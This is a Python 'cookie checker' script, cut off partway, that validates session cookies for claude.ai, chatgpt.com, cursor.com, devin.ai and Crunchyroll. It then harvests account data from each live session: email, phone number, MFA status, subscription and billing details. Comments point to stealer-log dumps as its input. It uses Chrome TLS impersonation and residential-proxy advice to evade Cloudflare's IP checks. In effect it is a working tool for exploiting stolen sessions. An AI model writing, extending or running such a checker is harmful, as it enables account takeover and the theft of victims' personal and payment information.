#!/usr/bin/env python3
"""
Multi-Site Cookie Checker
─────────────────────────
Validates cookies for: claude.ai, chatgpt.com, cursor.com, devin.ai, crunchyroll.com
Fetches full account info for alive sessions.

Usage:
    python cookie_checker.py                        # Interactive mode
    python cookie_checker.py -f cookies_folder/     # Folder of cookie files
    python cookie_checker.py -f cookies.json        # Single cookie file
    python cookie_checker.py -f cookies.txt         # Netscape format
"""

import argparse
import base64
import json
import os
import re
import sys
import time
import zipfile
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from pathlib import Path
from datetime import datetime

try:
    from curl_cffi import requests as cffi_requests
    HAS_CFFI = True
except ImportError:
    HAS_CFFI = False

import requests


# ─── Config ──────────────────────────────────────────────────────────────────
USER_AGENT = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
    "AppleWebKit/537.36 (KHTML, like Gecko) "
    "Chrome/124.0.0.0 Safari/537.36"
)

SITES = {
    "claude.ai":       {"color": "\033[95m", "icon": "🟣"},
    "chatgpt.com":     {"color": "\033[92m", "icon": "🟢"},
    "cursor.com":      {"color": "\033[96m", "icon": "🔵"},
    "devin.ai":        {"color": "\033[93m", "icon": "🟡"},
    "crunchyroll.com": {"color": "\033[91m", "icon": "🟠"},
}
RESET = "\033[0m"


# curl / Chrome export convention for HttpOnly cookies: the row is
# prefixed with ``#HttpOnly_`` so older parsers that treat ``#`` as a
# comment marker still skip it. Stealer-log and yt-dlp dumps inherit
# the same prefix because they save cookies straight from Chrome's
# cookie store. claude.ai's ``sessionKey``, crunchyroll's ``etp_rt`` /
# ``sess_id``, chatgpt's ``__Secure-next-auth.session-token`` are all
# HttpOnly, so without stripping this prefix the loader silently drops
# every auth cookie that actually matters.
_HTTPONLY_COOKIE_PREFIX = "#HttpOnly_"


# ─── Cookie Loaders ─────────────────────────────────────────────────────────
def load_cookies_json(filepath: str) -> list[dict]:
    """Load cookies from Playwright/browser JSON export."""
    with open(filepath) as f:
        data = json.load(f)
    if isinstance(data, list):
        return data
    if isinstance(data, dict):
        # Simple {name: value} dict
        return [{"name": k, "value": v, "domain": ""} for k, v in data.items()]
    return []


def load_cookies_netscape(filepath: str) -> list[dict]:
    """Load cookies from Netscape/Mozilla format (tab-separated).

    Accepts the ``#HttpOnly_<domain>...`` curl/Chrome extension —
    the prefix is stripped before tab-splitting so HttpOnly cookies
    (claude.ai's ``sessionKey``, crunchyroll's ``etp_rt`` / ``sess_id``,
    chatgpt's ``__Secure-next-auth.session-token`` etc.) parse the same
    as regular rows instead of being dropped as comments.
    """
    cookies = []
    with open(filepath) as f:
        for line in f:
            line = line.strip()
            if not line:
                continue
            # Peel off the HttpOnly marker before the blanket ``#`` skip.
            if line.startswith(_HTTPONLY_COOKIE_PREFIX):
                line = line[len(_HTTPONLY_COOKIE_PREFIX):]
            if line.startswith("#"):
                continue
            parts = line.split("\t")
            if len(parts) >= 7:
                cookies.append({
                    "domain": parts[0].lstrip(".\ufeff"),
                    "path": parts[2],
                    "secure": parts[3].upper() == "TRUE",
                    "expires": int(parts[4]) if parts[4].lstrip("-").isdigit() else 0,
                    "name": parts[5],
                    "value": parts[6],
                })
    return cookies


def load_cookies_header(text: str) -> list[dict]:
    """Load cookies from 'name=value; name2=value2' header string."""
    cookies = []
    for pair in text.split(";"):
        pair = pair.strip()
        if "=" in pair:
            name, value = pair.split("=", 1)
            cookies.append({"name": name.strip(), "value": value.strip(), "domain": ""})
    return cookies


def load_cookie_file(filepath: str) -> list[dict]:
    """Auto-detect format and load cookies from a file."""
    content = Path(filepath).read_text(encoding="utf-8", errors="ignore").strip()

    # JSON format
    if content.startswith("[") or content.startswith("{"):
        try:
            return load_cookies_json(filepath)
        except json.JSONDecodeError:
            pass

    # Netscape format (tab-separated, usually starts with domain or #).
    # Files that only contain HttpOnly cookies look like ``#HttpOnly_…``
    # on every data line, so we must treat those as tab-separated too
    # instead of letting the ``#`` filter blank the detection out.
    lines = content.split("\n")

    def _looks_like_netscape(raw: str) -> bool:
        body = raw[len(_HTTPONLY_COOKIE_PREFIX):] if raw.startswith(_HTTPONLY_COOKIE_PREFIX) else raw
        if body.startswith("#"):
            return False
        return "\t" in body and len(body.split("\t")) >= 7

    if any(_looks_like_netscape(line) for line in lines[:50]):
        return load_cookies_netscape(filepath)

    # Header string format
    if "=" in content and ";" in content and "\n" not in content.strip():
        return load_cookies_header(content)

    # Try line-by-line name=value
    cookies = []
    for line in lines:
        line = line.strip()
        if "=" in line and not line.startswith("#"):
            name, value = line.split("=", 1)
            cookies.append({"name": name.strip(), "value": value.strip(), "domain": ""})
    return cookies


def detect_site(cookies: list[dict], filename: str = "") -> str | None:
    """Detect which site cookies belong to based on domain or cookie names."""
    domains: set[str] = set()
    names: set[str] = set()
    for c in cookies:
        d = c.get("domain", "").lstrip(".")
        # ``#HttpOnly_`` prefixes occasionally survive into the parsed
        # ``domain`` field when the loader couldn't peel them (e.g. older
        # callers that pre-parsed the file). Strip defensively here.
        if d.startswith(_HTTPONLY_COOKIE_PREFIX):
            d = d[len(_HTTPONLY_COOKIE_PREFIX):].lstrip(".")
        domains.add(d)
        names.add(c.get("name", ""))

    fname = filename.lower()

    # Claude.ai
    if any("claude.ai" in d for d in domains) or "claude" in fname:
        return "claude.ai"
    if "sessionKey" in names or "__cf_bm" in names and any("anthropic" in d for d in domains):
        return "claude.ai"

    # ChatGPT
    if any("chatgpt.com" in d or "openai.com" in d or "chat.openai.com" in d for d in domains) or "chatgpt" in fname:
        return "chatgpt.com"
    if "__Secure-next-auth.session-token" in names or "_puid" in names:
        return "chatgpt.com"

    # Cursor
    if any("cursor.com" in d or "cursor.sh" in d for d in domains) or "cursor" in fname:
        return "cursor.com"
    if "WorkosCursorSessionToken" in names:
        return "cursor.com"

    # Devin
    if any("devin.ai" in d for d in domains) or "devin" in fname:
        return "devin.ai"

    # Crunchyroll
    if any("crunchyroll.com" in d for d in domains) or "crunchyroll" in fname or "crunchy" in fname:
        return "crunchyroll.com"
    if "etp_rt" in names or "sess_id" in names:
        return "crunchyroll.com"

    # Roblox — .ROBLOSECURITY is the single auth cookie.
    if any("roblox.com" in d for d in domains) or "roblox" in fname or "rblx" in fname:
        return "roblox.com"
    if ".ROBLOSECURITY" in names:
        return "roblox.com"

    # Blackbox.ai — next-auth.session-token / sessionId on app.blackbox.ai.
    if any("blackbox.ai" in d for d in domains) or "blackbox" in fname:
        return "blackbox.ai"

    return None


def cookies_to_jar(cookies: list[dict], domain: str = "") -> requests.cookies.RequestsCookieJar:
    """Convert cookie list to requests CookieJar."""
    jar = requests.cookies.RequestsCookieJar()
    for c in cookies:
        jar.set(
            c["name"],
            c["value"],
            domain=c.get("domain", "").lstrip(".") or domain,
            path=c.get("path", "/"),
        )
    return jar


def cookies_to_dict(cookies: list[dict]) -> dict:
    """Convert cookie list to simple {name: value} dict."""
    return {c["name"]: c["value"] for c in cookies}


def make_session(proxy: str | None = None) -> requests.Session:
    """Create a requests session with optional proxy."""
    s = requests.Session()
    s.headers.update({
        "User-Agent": USER_AGENT,
        "Accept": "application/json, text/html, */*",
        "Accept-Language": "en-US,en;q=0.9",
    })
    if proxy:
        s.proxies = {"http": proxy, "https": proxy}
    return s


def cffi_get(url: str, cookies: dict, proxy: str | None = None, headers: dict | None = None) -> dict | None:
    """Make a GET request using curl_cffi for better TLS fingerprinting."""
    if not HAS_CFFI:
        return None
    hdrs = {
        "User-Agent": USER_AGENT,
        "Accept": "application/json",
        "Accept-Language": "en-US,en;q=0.9",
    }
    if headers:
        hdrs.update(headers)
    try:
        r = cffi_requests.get(
            url, cookies=cookies, headers=hdrs,
            impersonate="chrome124",
            proxies={"http": proxy, "https": proxy} if proxy else None,
            timeout=15,
        )
        return {"status": r.status_code, "text": r.text, "json": r.json() if r.headers.get("content-type", "").startswith("application/json") else None}
    except Exception as e:
        return {"status": 0, "text": str(e), "json": None}


# ─── Site Checkers ───────────────────────────────────────────────────────────

def _safe_get(session, url, headers, timeout=10, retries=2):
    """GET with retry + rate-limit handling."""
    for attempt in range(retries + 1):
        try:
            r = session.get(url, headers=headers, timeout=timeout)
            if r.status_code == 429:
                wait = min(2 ** attempt * 2, 10)
                time.sleep(wait)
                continue
            return r
        except (requests.exceptions.ConnectionError, requests.exceptions.Timeout):
            if attempt < retries:
                time.sleep(1 + attempt)
                continue
            raise
    return r


def _safe_post(session, url, headers, data=None, timeout=10, retries=2):
    """POST with retry + rate-limit handling."""
    for attempt in range(retries + 1):
        try:
            r = session.post(url, headers=headers, data=data, timeout=timeout)
            if r.status_code == 429:
                wait = min(2 ** attempt * 2, 10)
                time.sleep(wait)
                continue
            return r
        except (requests.exceptions.ConnectionError, requests.exceptions.Timeout):
            if attempt < retries:
                time.sleep(1 + attempt)
                continue
            raise
    return r


def cffi_post(
    url: str,
    cookies: dict,
    headers: dict | None = None,
    data: str | dict | None = None,
    proxy: str | None = None,
) -> dict | None:
    """POST counterpart to ``cffi_get``. Returns the same normalised shape."""
    if not HAS_CFFI:
        return None
    hdrs = {
        "User-Agent": USER_AGENT,
        "Accept": "application/json",
        "Accept-Language": "en-US,en;q=0.9",
    }
    if headers:
        hdrs.update(headers)
    try:
        r = cffi_requests.post(
            url, cookies=cookies, headers=hdrs, data=data,
            impersonate="chrome124",
            proxies={"http": proxy, "https": proxy} if proxy else None,
            timeout=15,
        )
        return {
            "status": r.status_code,
            "text": r.text,
            "json": r.json() if r.headers.get("content-type", "").startswith("application/json") else None,
        }
    except Exception as e:
        return {"status": 0, "text": str(e), "json": None}


# Markers that distinguish a Cloudflare challenge page from a normal 403.
# Cloudflare ties ``cf_clearance`` to the requester's IP, so cookies that
# work in a browser will still 403 when replayed from a different IP.
# Reporting that explicitly tells the user they need the same residential
# IP / a proxy, rather than misleading them into thinking the session is
# dead.
_CF_CHALLENGE_MARKERS = (
    "Just a moment...",
    "cf-chl-bypass",
    "challenge-platform",
    "_cf_chl_opt",
    "__cf_chl_jschl_tk__",
    "cf-mitigated",
)


def _looks_like_cf_challenge(text: str) -> bool:
    if not text:
        return False
    return any(m in text for m in _CF_CHALLENGE_MARKERS)


def _http_error_message(resp: dict, endpoint: str) -> str:
    """Turn a normalised ``_request_json`` response into a user-facing error.

    The legacy checkers used to silently return ``alive=False`` for any
    non-200, which made dead cookies indistinguishable from datacenter
    Cloudflare blocks. Surface the distinction so the bot can tell the
    user whether to refresh cookies or to use a residential proxy.
    """
    status = resp.get("status", 0)
    text = resp.get("text") or ""
    via = resp.get("via") or "requests"

    if status == 0:
        # Connection error / exception text was placed in ``text``.
        return f"network error talking to {endpoint}: {text[:200]}"
    if status == 401:
        return f"{endpoint} returned 401 (cookie unauthorized — session is dead)"
    if status == 403:
        if _looks_like_cf_challenge(text):
            return (
                f"{endpoint} returned a Cloudflare challenge "
                f"(403, via={via}); session likely alive but the IP isn't trusted — "
                "use a residential proxy or refresh cookies from the same IP."
            )
        return f"{endpoint} returned 403"
    if status == 429:
        return f"{endpoint} returned 429 (rate-limited)"
    return f"{endpoint} returned HTTP {status}"


def _request_json(
    session: "requests.Session",
    url: str,
    headers: dict,
    cookie_dict: dict,
    method: str = "GET",
    data: str | dict | None = None,
    proxy: str | None = None,
    timeout: int = 15,
) -> dict:
    """Hit ``url`` and return a normalised ``{status, text, json, via}`` dict.

    Tries curl_cffi (Chrome TLS impersonation) first because every site
    we check that isn't roblox/blackbox is Cloudflare-fronted. Falls back
    to the plain ``requests`` session if curl_cffi isn't installed, fails,
    or also returns a 403 challenge that the requests session might bypass
    (rare but cheap to try).
    """
    method = method.upper()

    def _via_requests() -> dict:
        try:
            if method == "POST":
                r = _safe_post(session, url, headers, data=data, timeout=timeout)
            else:
                r = _safe_get(session, url, headers, timeout=timeout)
        except Exception as e:  # noqa: BLE001
            return {"status": 0, "text": str(e), "json": None, "via": "requests"}
        body = r.text or ""
        parsed = None
        ctype = r.headers.get("content-type", "")
        if ctype.startswith("application/json"):
            try:
                parsed = r.json()
            except (ValueError, TypeError):
                parsed = None
        return {"status": r.status_code, "text": body, "json": parsed, "via": "requests"}

    def _via_cffi() -> dict | None:
        if not HAS_CFFI:
            return None
        if method == "POST":
            out = cffi_post(url, cookie_dict, headers=headers, data=data, proxy=proxy)
        else:
            out = cffi_get(url, cookie_dict, proxy=proxy, headers=headers)
        if out is None:
            return None
        out = dict(out)
        out["via"] = "cffi"
        return out

    cffi_resp = _via_cffi()
    if cffi_resp and cffi_resp.get("status") == 200:
        return cffi_resp

    requests_resp = _via_requests()
    if requests_resp.get("status") == 200:
        return requests_resp

    # Both failed — prefer the cffi response (richer status info)
    # but fall back to the requests one if cffi was unavailable.
    return cffi_resp or requests_resp


def check_claude(cookies: list[dict], proxy: str | None = None) -> dict:
    """Check claude.ai session and fetch account info."""
    result = {"alive": False, "info": {}}
    cd = cookies_to_dict(cookies)

    headers = {
        "User-Agent": USER_AGENT,
        "Accept": "application/json",
        "Referer": "https://claude.ai/",
        "Origin": "https://claude.ai",
    }

    try:
        s = make_session(proxy)
        jar = cookies_to_jar(cookies, "claude.ai")
        s.cookies = jar

        # claude.ai is Cloudflare-fronted, so prefer curl_cffi Chrome
        # impersonation; fall back to plain requests if cffi isn't
        # available. _request_json surfaces 401/403/CF as a clear error
        # instead of silently returning alive=False.
        resp = _request_json(
            s, "https://claude.ai/api/organizations", headers, cd,
            method="GET", proxy=proxy, timeout=15,
        )
        if resp["status"] != 200:
            result["error"] = _http_error_message(resp, "claude.ai/api/organizations")
            return result

        orgs = resp["json"]
        if orgs is None:
            try:
                import json as _json
                orgs = _json.loads(resp["text"])
            except (ValueError, TypeError):
                orgs = None

        if True:
            result["alive"] = True
            if isinstance(orgs, list) and orgs:
                org = orgs[0]
                result["info"]["organization"] = org.get("name", "N/A")
                result["info"]["org_id"] = org.get("uuid", "N/A")
                result["info"]["capabilities"] = org.get("capabilities", [])
                result["info"]["billing_type"] = org.get("billing_type", "N/A")
                result["info"]["rate_limit_tier"] = org.get("rate_limit_tier", "N/A")
                result["info"]["created_at"] = org.get("created_at", "N/A")

                # Plan detection
                caps = str(org.get("capabilities", []))
                billing = org.get("billing_type", "none")
                if "claude_pro" in caps or billing == "stripe":
                    result["info"]["plan"] = "Pro"
                elif org.get("raven_type"):
                    result["info"]["plan"] = "Team/Enterprise"
                else:
                    result["info"]["plan"] = "Free"

                # Free credits
                result["info"]["free_credits"] = org.get("free_credits_status", "N/A")
                result["info"]["active_flags"] = org.get("active_flags", [])

    except Exception as e:
        result["error"] = str(e)
        return result

    # Below blocks reuse the open session ``s`` for the secondary endpoints.
    try:
        # Usage info
        if result["alive"] and result["info"].get("org_id"):
            try:
                r_usage = _safe_get(s, f"https://claude.ai/api/organizations/{result['info']['org_id']}/usage", headers)
                if r_usage.status_code == 200:
                    usage = r_usage.json()
                    five_h = usage.get("five_hour", {})
                    seven_d = usage.get("seven_day", {})
                    result["info"]["usage_5h"] = f"{five_h.get('utilization', 0):.0%}"
                    result["info"]["usage_5h_resets"] = five_h.get("resets_at", "N/A")
                    result["info"]["usage_7d"] = f"{seven_d.get('utilization', 0):.0%}"
                    result["info"]["usage_7d_resets"] = seven_d.get("resets_at", "N/A")
                    if usage.get("extra_usage"):
                        result["info"]["has_extra_usage"] = True
            except:
                pass

            # Billing
            try:
                r_bill = _safe_get(s, f"https://claude.ai/api/organizations/{result['info']['org_id']}/settings/billing", headers)
                if r_bill.status_code == 200:
                    bill = r_bill.json()
                    result["info"]["billing_period_start"] = bill.get("current_period_start", "N/A")
                    result["info"]["billing_period_end"] = bill.get("current_period_end", "N/A")
                    result["info"]["plan_name"] = bill.get("plan", {}).get("name", "N/A") if isinstance(bill.get("plan"), dict) else "N/A"
            except:
                pass

        # Email extraction
        if result["alive"]:
            try:
                r3 = _safe_get(s, "https://claude.ai/api/settings", headers)
                if r3.status_code == 200:
                    settings = r3.json()
                    result["info"]["email"] = settings.get("email", "N/A")
                    result["info"]["name"] = settings.get("name", settings.get("full_name", "N/A"))
            except:
                pass

            if result["info"].get("email", "N/A") == "N/A":
                org_name = result["info"].get("organization", "")
                if "\u2019s Organization" in org_name:
                    result["info"]["email"] = org_name.replace("\u2019s Organization", "").strip()
                elif "'s Organization" in org_name:
                    result["info"]["email"] = org_name.replace("'s Organization", "").strip()
    except Exception:
        # Secondary endpoints are best-effort; don't overwrite a successful
        # alive=True just because a follow-up call broke.
        pass

    return result


def check_chatgpt(cookies: list[dict], proxy: str | None = None) -> dict:
    """Check chatgpt.com session and fetch account info."""
    result = {"alive": False, "info": {}}
    cd = cookies_to_dict(cookies)

    # Extract user info from oai-client-auth-info cookie (works even without active session)
    auth_info_raw = cd.get("oai-client-auth-info", "")
    if auth_info_raw:
        try:
            from urllib.parse import unquote
            auth_info = json.loads(unquote(auth_info_raw))
            user = auth_info.get("user", {})
            if user:
                result["info"]["email"] = user.get("email", "N/A")
                result["info"]["name"] = user.get("name", "N/A")
                result["info"]["connection_type"] = user.get("connectionType", "N/A")
        except:
            pass

    headers = {
        "User-Agent": USER_AGENT,
        "Accept": "*/*",
        "Referer": "https://chatgpt.com/",
        "Origin": "https://chatgpt.com",
    }

    try:
        s = make_session(proxy)
        jar = cookies_to_jar(cookies, "chatgpt.com")
        s.cookies = jar

        r = _safe_get(s, "https://chatgpt.com/api/auth/session", headers, timeout=15)
        if r.status_code == 200:
            data = r.json()
            # Must have actual user data or accessToken (not just WARNING_BANNER)
            if data.get("user") or data.get("accessToken"):
                result["alive"] = True
                user = data.get("user", {})
                if user:
                    result["info"]["email"] = user.get("email", result["info"].get("email", "N/A"))
                    result["info"]["name"] = user.get("name", result["info"].get("name", "N/A"))
                    result["info"]["image"] = user.get("image", "N/A")
                    result["info"]["picture"] = user.get("picture", "N/A")

                access_token = data.get("accessToken")
                if access_token:
                    result["info"]["has_access_token"] = True
                    auth_headers = {**headers, "Authorization": f"Bearer {access_token}"}

                    # Get /me
                    try:
                        r2 = _safe_get(s, "https://chatgpt.com/backend-api/me", auth_headers)
                        if r2.status_code == 200:
                            me = r2.json()
                            result["info"]["id"] = me.get("id", "N/A")
                            result["info"]["phone_number"] = me.get("phone_number", "N/A")
                            result["info"]["created"] = me.get("created", "N/A")
                            result["info"]["mfa"] = me.get("mfa_flag_enabled", False)
                            groups = me.get("groups", [])
                            result["info"]["groups"] = groups
                            if "chatgpt-paid" in groups or "chatgpt-plus" in groups:
                                result["info"]["plan"] = "Plus"
                            elif "chatgpt-pro" in groups:
                                result["info"]["plan"] = "Pro"
                            elif "chatgpt-team" in groups:
                                result["info"]["plan"] = "Team"
                            else:
                                result["info"]["plan"] = "Free"
                    except:
                        pass

                    # Get /accounts/check for subscription details
                    try:
                        r_acc = _safe_get(s, "https://chatgpt.com/backend-api/accounts/check/v4-2023-04-27", auth_headers)
                        if r_acc.status_code == 200:
                            acc = r_acc.json()
                            accounts = acc.get("accounts", {})
                            for acc_id, acc_data in accounts.items():
                                entitlement = acc_data.get("entitlement", {})
                                sub_id = entitlement.get("subscription_id")
                                if sub_id:
                                    result["info"]["subscription_id"] = sub_id
                                    result["info"]["subscription_plan"] = entitlement.get("subscription_plan", "N/A")
                                expires = entitlement.get("expires_at")
                                if expires:
                                    result["info"]["expires_at"] = expires
                                    # Plan detection from subscription
                                    plan_type = entitlement.get("subscription_plan", "")
                                    if "plus" in plan_type.lower():
                                        result["info"]["plan"] = "Plus"
                                    elif "pro" in plan_type.lower():
                                        result["info"]["plan"] = "Pro"
                                    elif "team" in plan_type.lower():
                                        result["info"]["plan"] = "Team"
                                is_paid = acc_data.get("is_deactivated") == False and sub_id
                                if is_paid and not result["info"].get("plan"):
                                    result["info"]["plan"] = "Paid"
                                break
                    except:
                        pass

                    # Get models
                    try:
                        r3 = _safe_get(s, "https://chatgpt.com/backend-api/models?history_and_training_disabled=false", auth_headers)
                        if r3.status_code == 200:
                            models = r3.json()
                            model_slugs = [m.get("slug", "") for m in models.get("models", [])]
                            result["info"]["models"] = model_slugs
                    except:
                        pass
            elif not data.get("user") and not data.get("accessToken"):
                # Session returned 200 but no user data = dead
                pass

    except Exception as e:
        result["error"] = str(e)

    return result


def check_cursor(cookies: list[dict], proxy: str | None = None) -> dict:
    """Check cursor.com session and fetch account info."""
    import base64
    from urllib.parse import unquote

    result = {"alive": False, "info": {}}
    cd = cookies_to_dict(cookies)

    # Extract info from JWT in WorkosCursorSessionToken
    token_raw = cd.get("WorkosCursorSessionToken", "")
    if token_raw:
        token_decoded = unquote(token_raw)
        # JWT is after the :: separator
        jwt_part = token_decoded.split("::")[-1] if "::" in token_decoded else token_decoded
        try:
            parts = jwt_part.split(".")
            if len(parts) >= 2:
                payload = parts[1]
                padded = payload + "=" * (4 - len(payload) % 4)
                decoded = json.loads(base64.urlsafe_b64decode(padded))
                result["info"]["jwt_sub"] = decoded.get("sub", "N/A")
                result["info"]["jwt_scope"] = decoded.get("scope", "N/A")
                exp = decoded.get("exp")
                if exp:
                    result["info"]["token_expires"] = datetime.fromtimestamp(exp).isoformat()
                    result["info"]["token_expired"] = time.time() > exp
                iss = decoded.get("iss")
                if iss:
                    result["info"]["issuer"] = iss
        except:
            pass

    headers = {
        "User-Agent": USER_AGENT,
        "Accept": "application/json",
        "Referer": "https://www.cursor.com/settings",
    }

    try:
        s = make_session(proxy)
        jar = cookies_to_jar(cookies, "cursor.com")
        s.cookies = jar

        r = _safe_get(s, "https://www.cursor.com/api/auth/session", headers, timeout=15)
        if r.status_code == 200:
            try:
                data = r.json()
            except:
                data = {}
            if data.get("user") or data.get("email"):
                result["alive"] = True
                user = data.get("user", data)
                result["info"]["email"] = user.get("email", data.get("email", "N/A"))
                result["info"]["name"] = user.get("name", data.get("name", "N/A"))
                result["info"]["image"] = user.get("image", "N/A")

        if result["alive"]:
            # Usage
            try:
                r2 = _safe_get(s, "https://www.cursor.com/api/usage", headers)
                if r2.status_code == 200:
                    usage = r2.json()
                    # Parse usage into readable format
                    if isinstance(usage, dict):
                        for model, data in usage.items():
                            if isinstance(data, dict) and "numRequests" in data:
                                result["info"][f"usage_{model}"] = f"{data['numRequests']}/{data.get('maxRequestUsage', '?')}"
            except:
                pass

            # Stripe/subscription
            try:
                r3 = _safe_get(s, "https://www.cursor.com/api/auth/stripe", headers)
                if r3.status_code == 200:
                    stripe = r3.json()
                    result["info"]["plan"] = stripe.get("membershipType", stripe.get("plan", "Free"))
                    sub = stripe.get("subscription")
                    if isinstance(sub, dict):
                        result["info"]["subscription_status"] = sub.get("status", "N/A")
                        period_end = sub.get("current_period_end")
                        if period_end:
                            result["info"]["renewal_date"] = datetime.fromtimestamp(period_end).isoformat()
                        period_start = sub.get("current_period_start")
                        if period_start:
                            result["info"]["period_start"] = datetime.fromtimestamp(period_start).isoformat()
                        result["info"]["cancel_at_period_end"] = sub.get("cancel_at_period_end", False)
                    elif sub:
                        result["info"]["subscription"] = str(sub)
            except:
                pass
        elif not result["alive"] and result["info"].get("token_expired") == False:
            # Token not expired but session API failed = might be alive, mark as possible
            result["info"]["note"] = "token_not_expired_but_session_failed"

    except Exception as e:
        result["error"] = str(e)

    return result


def check_devin(cookies: list[dict], proxy: str | None = None) -> dict:
    """Check devin.ai session and fetch account info."""
    result = {"alive": False, "info": {}}
    cd = cookies_to_dict(cookies)

    headers = {
        "User-Agent": USER_AGENT,
        "Accept": "application/json",
        "Referer": "https://app.devin.ai/",
        "Origin": "https://app.devin.ai",
    }

    try:
        s = make_session(proxy)
        jar = cookies_to_jar(cookies, "app.devin.ai")
        s.cookies = jar

        r = _safe_get(s, "https://app.devin.ai/api/auth/session", headers, timeout=15)
        if r.status_code == 200:
            try:
                data = r.json()
            except:
                data = {}
            if data.get("user") or data.get("email"):
                result["alive"] = True
                user = data.get("user", data)
                result["info"]["email"] = user.get("email", data.get("email", "N/A"))
                result["info"]["name"] = user.get("name", data.get("name", "N/A"))
                result["info"]["image"] = user.get("image", "N/A")

    except Exception as e:
        result["error"] = str(e)

    return result


_CR_WEB_CLIENT_ID = "noaihdevm_6iyg0a8l0q"


def _crunchyroll_token_body(cd: dict) -> str:
    """Build the form body the current Crunchyroll web token endpoint requires.

    The legacy ``grant_type=etp_rt_cookie`` body alone now returns
    ``invalid_request / missing_required_field`` — the live web SPA also sends
    a ``device_id`` (the same value as the ``device_id`` cookie) and a
    free-form ``device_type``. Both fields are mandatory; without them the
    request 400s. The ``device_id`` falls back to a stable UUIDv4 if the
    cookie is absent, mirroring what the web client does on its first visit.
    """
    from urllib.parse import urlencode
    device_id = cd.get("device_id") or "00000000-0000-4000-8000-000000000000"
    return urlencode({
        "grant_type": "etp_rt_cookie",
        "device_id": device_id,
        "device_type": "Chrome on Linux",
    })


def check_crunchyroll(cookies: list[dict], proxy: str | None = None) -> dict:
    """Check crunchyroll.com session and fetch account info."""
    result = {"alive": False, "info": {}}
    cd = cookies_to_dict(cookies)

    # Check if etp_rt cookie exists (required for auth)
    has_etp = any(c.get("name") == "etp_rt" for c in cookies)
    if not has_etp:
        result["error"] = "no etp_rt cookie"
        return result

    # ``noaihdevm_6iyg0a8l0q`` is the public web client_id Crunchyroll ships
    # in the SPA bundle today; the secret is empty (PKCE-style) so the
    # base64 ends with ``Og==``. The old ``hrho9q3awvsk22u-ts5a`` client was
    # retired and now returns ``unsupported_grant_type``.
    BASIC_AUTH = base64.b64encode(f"{_CR_WEB_CLIENT_ID}:".encode()).decode()

    try:
        s = make_session(proxy)
        jar = cookies_to_jar(cookies, "crunchyroll.com")
        s.cookies = jar

        token_headers = {
            "User-Agent": USER_AGENT,
            "Authorization": f"Basic {BASIC_AUTH}",
            "Content-Type": "application/x-www-form-urlencoded",
            "Referer": "https://www.crunchyroll.com/",
            "Origin": "https://www.crunchyroll.com",
        }

        # crunchyroll.com is Cloudflare-fronted on both www and beta-api;
        # prefer curl_cffi impersonation and surface 401/403/CF challenges
        # as explicit errors instead of silently returning alive=False.
        resp = _request_json(
            s, "https://beta-api.crunchyroll.com/auth/v1/token", token_headers, cd,
            method="POST",
            data=_crunchyroll_token_body(cd),
            proxy=proxy,
            timeout=15,
        )

        if resp["status"] != 200:
            result["error"] = _http_error_message(resp, "crunchyroll auth/v1/token")
            return result

        if True:
            token_info = resp["json"]
            if token_info is None:
                try:
                    import json as _json
                    token_info = _json.loads(resp["text"])
                except (ValueError, TypeError):
                    token_info = {}
            token_info = token_info or {}
            access_token = token_info.get("access_token")
            result["info"]["country"] = token_info.get("country", "N/A")
            result["info"]["token_type"] = token_info.get("token_type", "N/A")
            result["info"]["scope"] = token_info.get("scope", "N/A")
            expires_in = token_info.get("expires_in")
            if expires_in:
                result["info"]["token_expires_in"] = f"{expires_in}s"

            if access_token:
                result["alive"] = True
                auth_headers = {
                    "User-Agent": USER_AGENT,
                    "Authorization": f"Bearer {access_token}",
                    "Accept": "application/json",
                }

                # Account info
                try:
                    r2 = _safe_get(s, "https://beta-api.crunchyroll.com/accounts/v1/me", auth_headers)
                    if r2.status_code == 200:
                        acc = r2.json()
                        result["info"]["account_id"] = acc.get("account_id", "N/A")
                        result["info"]["external_id"] = acc.get("external_id", "N/A")
                        result["info"]["email_verified"] = acc.get("email_verified", "N/A")
                        result["info"]["created"] = acc.get("created", "N/A")
                except:
                    pass

                # Profile info
                try:
                    r3 = _safe_get(s, "https://beta-api.crunchyroll.com/accounts/v1/me/profile", auth_headers)
                    if r3.status_code == 200:
                        profile = r3.json()
                        result["info"]["username"] = profile.get("username", "N/A")
                        result["info"]["email"] = profile.get("email", "N/A")
                        result["info"]["preferred_language"] = profile.get("preferred_content_subtitle_language", "N/A")
                        result["info"]["maturity_rating"] = profile.get("maturity_rating", "N/A")
                        result["info"]["avatar"] = profile.get("avatar", "N/A")
                except:
                    pass

                # Subscription info
                try:
                    account_id = result["info"].get("external_id") or result["info"].get("account_id")
                    if account_id and account_id != "N/A":
                        r4 = _safe_get(s, f"https://beta-api.crunchyroll.com/subs/v3/subscriptions/{account_id}/products", auth_headers)
                        if r4.status_code == 200:
                            subs = r4.json()
                            items = subs.get("items", subs.get("data", []))
                            if items:
                                sub = items[0] if isinstance(items, list) else items
                                # Crunchyroll's actual SKU/name strings come back as
                                # `crunchyroll.fanpack.monthly` / `…megafanpack…` /
                                # `…ultimatefanpack…`. Map them to the user-visible
                                # tier names the dashboard buckets by.
                                _raw_name = (sub.get("name") or "").lower()
                                _raw_sku  = (sub.get("sku")  or "").lower()
                                _haystack = f"{_raw_name} {_raw_sku}"
                                if "ultimate" in _haystack or "ultimatefan" in _haystack:
                                    plan_name = "Ultimate Fan"
                                elif "megafan" in _haystack or "mega fan" in _haystack or "mega" in _haystack:
                                    plan_name = "Mega Fan"
                                elif "fanpack" in _haystack or _raw_name == "fan" or "fan" in _haystack:
                                    plan_name = "Fan"
                                elif sub.get("name"):
                                    plan_name = sub.get("name")
                                else:
                                    plan_name = "Premium"
                                result["info"]["plan"]      = plan_name
                                result["info"]["plan_name"] = plan_name
                                result["info"]["plan_sku"]  = sub.get("sku", "N/A")
                                result["info"]["subscription_active"] = True
                                # Renewal/expiry dates
                                result["info"]["effective_date"] = sub.get("effective_date", "N/A")
                                result["info"]["expiration_date"] = sub.get("expiration_date", "N/A")
                                result["info"]["auto_renew"] = sub.get("auto_renew", "N/A")
                                result["info"]["source"] = sub.get("source", "N/A")
                                result["info"]["trial_period"] = sub.get("is_in_trial_period", False)
                            else:
                                result["info"]["plan"] = "Free"
                                result["info"]["subscription_active"] = False
                        else:
                            result["info"]["plan"] = "Unknown"

                        # Also check /benefits for entitlements
                        try:
                            r5 = _safe_get(s, f"https://beta-api.crunchyroll.com/subs/v1/subscriptions/{account_id}/benefits", auth_headers)
                            if r5.status_code == 200:
                                benefits = r5.json()
                                benefit_items = benefits.get("items", [])
                                if benefit_items:
